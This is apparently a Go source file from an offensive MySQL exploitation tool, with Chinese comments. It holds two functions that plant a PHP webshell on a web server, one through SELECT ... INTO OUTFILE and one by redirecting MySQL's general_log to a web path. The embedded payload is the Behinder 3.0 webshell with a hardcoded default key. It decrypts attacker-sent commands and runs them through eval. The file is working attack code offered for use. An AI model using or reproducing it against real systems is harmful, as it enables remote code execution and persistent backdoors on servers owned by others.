package pac

import (
	"database/sql"
	"fmt"
)

func Webshell_IntoOutFile(conn *sql.DB, path string) {
	Info("\n1、知道网站物理路径\n2、高权限数据库用户\n3、load_file() 开启 即 secure_file_priv 无限制\n4、网站路径有写入权限")
	m, err := MysqlCMD("show global variables like '%secure_file_priv%';", conn)
	if err != nil {
		Err(err)
	}
	fmt.Printf("%v\n", m[0]["Value"])
	secure_file_priv := fmt.Sprintf("%v", m[0]["Value"])
	//fmt.Printf("%T", secure_file_priv)
	if secure_file_priv == "NULL" {
		Info("secure_file_priv的值为NULL，不允许导入或导出")
	} else if secure_file_priv == "/" {
		Info("secure_file_priv的值为/，只允许在 / 目录导入导出")
	} else if secure_file_priv == "" {
		Info("secure_file_priv的值为空，不限制导入导出,尝试写webshell,默认写冰蝎3.0php,默认密钥")
		a := fmt.Sprintf("select '<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION[\"k\"]=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded(\"openssl\")){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode(\"|\",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);?>' into outfile '%s'", path)
		Info(a)
		MysqlCMD(a, conn)
	} else {
		Info("secure_file_priv的值不为NULL,/和空，请手动尝试！")
	}
}

func Webshell_logshell(conn *sql.DB, path string) {
	Info("\n1、数据库为 root 权限\n2、Web 目录可写\n3、知道 Web 的物理绝对路径")
	m, err := MysqlCMD("SHOW VARIABLES LIKE '%general%';", conn)
	if err != nil {
		Err(err)
	}
	fmt.Printf("%v\n", m[0]["Value"])
	fmt.Sprintf("%v\n", m[0][""])
	Info("执行set global general_log = \"ON\";开启general_log")
	MysqlCMD("set global general_log = \"ON\";", conn)
	// set global general_log_file='c:/phpstudy_pro/www/shell.php';
	a := fmt.Sprintf("set global general_log_file='%s';", path)
	Info("执行set global general_log_file='c:/phpstudy_pro/www/shell.php';修改general_log_file路径")
	MysqlCMD(a, conn)
	Info("尝试写入webshell")
	b := fmt.Sprintf("select '<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION[\"k\"]=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded(\"openssl\")){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode(\"|\",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);?>'")
	MysqlCMD(b, conn)
	Success("执行完成，请尝试连接webshell，默认3.0冰蝎，默认密钥")

}
